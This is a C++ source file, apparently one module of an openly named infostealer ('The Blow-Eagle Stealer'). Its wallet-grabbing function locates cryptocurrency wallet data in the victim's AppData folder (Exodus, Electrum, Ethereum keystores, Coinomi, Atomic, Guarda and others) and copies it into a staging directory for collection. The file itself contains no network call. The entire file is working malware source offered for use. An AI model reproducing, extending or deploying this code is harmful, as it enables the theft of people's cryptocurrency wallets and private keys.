/*
|==================================================================================================================|
|████████╗██╗░░██╗███████╗  ██████╗░██╗░░░░░░█████╗░░██╗░░░░░░░██╗░░░░░░███████╗░█████╗░░██████╗░██╗░░░░░███████╗ |
|╚══██╔══╝██║░░██║██╔════╝  ██╔══██╗██║░░░░░██╔══██╗░██║░░██╗░░██║░░░░░░██╔════╝██╔══██╗██╔════╝░██║░░░░░██╔════╝ |
|░░░██║░░░███████║█████╗░░  ██████╦╝██║░░░░░██║░░██║░╚██╗████╗██╔╝█████╗█████╗░░███████║██║░░██╗░██║░░░░░█████╗░░ |
|░░░██║░░░██╔══██║██╔══╝░░  ██╔══██╗██║░░░░░██║░░██║░░████╔═████║░╚════╝██╔══╝░░██╔══██║██║░░╚██╗██║░░░░░██╔══╝░░ |
|░░░██║░░░██║░░██║███████╗  ██████╦╝███████╗╚█████╔╝░░╚██╔╝░╚██╔╝░░░░░░░███████╗██║░░██║╚██████╔╝███████╗███████╗ |
|░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═════╝░╚══════╝░╚════╝░░░░╚═╝░░░╚═╝░░░░░░░░╚══════╝╚═╝░░╚═╝░╚═════╝░╚══════╝╚══════╝ |
|                                                                                                                  |
|                               ░██████╗████████╗███████╗░█████╗░██╗░░░░░███████╗██████╗░                          |
|                               ██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║░░░░░██╔════╝██╔══██╗                          |
|                               ╚█████╗░░░░██║░░░█████╗░░███████║██║░░░░░█████╗░░██████╔╝                          |
|                               ░╚═══██╗░░░██║░░░██╔══╝░░██╔══██║██║░░░░░██╔══╝░░██╔══██╗                          |
|                               ██████╔╝░░░██║░░░███████╗██║░░██║███████╗███████╗██║░░██║                          |
|                               ╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚══════╝╚══════╝╚═╝░░╚═╝                          |
|==================================================================================================================|

-----------------------------------------------------------------
|by: Nick_Vinesmoke                                             |
|Autor github: https://github.com/Nick-Vinesmoke                |
|Original repo: https://github.com/Nick-Vinesmoke/The-Blow-Eagle|
-----------------------------------------------------------------
*/

#include "../targets.h"
#include "../../config/config.cpp"
#include  "../../helper/helper.h"

struct PathsAndDirs
{
    std::string path1;
    std::string path2;
    std::string path3;
};

void wallets::Wallets()
{
	printf("wallets\n");
	std::string user = func::GetUser();
	std::string local = "C:/Users/" + user + "/AppData/Local";
	std::string roaming = "C:/Users/" + user + "/AppData/Roaming";


    PathsAndDirs create[] =
    {
        {"/Zcash","/Zcash","/Zcash"},
        {"/Armory","/Armory","/Armory"},
        {"/bytecoin","/bytecoin","/bytecoin"},
        {"/Exodus","/Exodus/exodus.wallet","/Exodus/exodus.wallet"},
        {"/Ethereum","/Ethereum/keystore","/Ethereum/keystore"},
        {"/Electrum","/Electrum/wallets","/Electrum/wallets"},
        {"/Coinomi","/Coinomi/Coinomi","/Coinomi/Coinomi/wallets"},
        {"/FeatherWallet","/FeatherWallet","/FeatherWallet"},
        {"/com.liberty.jaxx","/com.liberty.jaxx/IndexedDB","/com.liberty.jaxx/IndexedDB"},
        {"/atomic","/atomic/Local Storage","/atomic/Local Storage"},
        {"/Guarda","/Guarda/Local Storage","/Guarda/Local Storage"}
    };

    std::string dirs[] = {
        "/Zcash",
        "/Armory",
        "/bytecoin",
        "/Exodus/exodus.wallet",
        "/Ethereum/keystore",
        "/Electrum/wallets",
        "/Coinomi/Coinomi/wallets",
        "/FeatherWallet"
    };

    std::string files[] =
    {
        "/com.liberty.jaxx/IndexedDB/file__0.indexeddb.leveldb",
        "/atomic/Local Storage/leveldb",
        "/Guarda/Local Storage/leveldb"
    };

    std::string defaultPaths[] = {

    "C:/Users/" + user + config::path + "/Wallets",

    };

    for (size_t j = 0; j < std::size(defaultPaths); j++)
    {
        int result = _mkdir(defaultPaths[j].c_str());
    }
    
    std::string dir = "";
    int result = 0;

    for (size_t i = 0; i < std::size(dirs); i++)
    {
        if (std::filesystem::exists(roaming + dirs[i]))
        {
            try
            {
                dir = defaultPaths[0] + create[i].path1;
                result = _mkdir(dir.c_str());
                //std::cout << result << dir << '\n';
                dir = defaultPaths[0] + create[i].path2;
                result = _mkdir(dir.c_str());
                // std::cout << result << dir << '\n';
                dir = defaultPaths[0] + create[i].path3;
                result = _mkdir(dir.c_str());
                //std::cout << result << dir << '\n';
                func::copyDirectory(roaming + dirs[i], defaultPaths[0] + dirs[i]);
            }
            catch (const char* error_message)
            {
                std::cout << error_message << std::endl;
            }
        }
    }

    for (size_t i = 0; i < std::size(files); i++)
    {
        if (std::filesystem::exists(roaming + files[i]))
        {
            try 
            {
                dir = defaultPaths[0] + create[i + std::size(dirs)].path1;
                result = _mkdir(dir.c_str());
                //std::cout << result << dir << '\n';
                dir = defaultPaths[0] + create[i + std::size(dirs)].path2;
                result = _mkdir(dir.c_str());
                // std::cout << result << dir << '\n';
                dir = defaultPaths[0] + create[i + std::size(dirs)].path3;
                result = _mkdir(dir.c_str());
                //std::cout << result << dir << '\n';
                func::copyFile(roaming + files[i], defaultPaths[0] + files[i]);
            }
            catch (const char* error_message)
            {
                std::cout << error_message << std::endl;
            }
            
        }
    }
}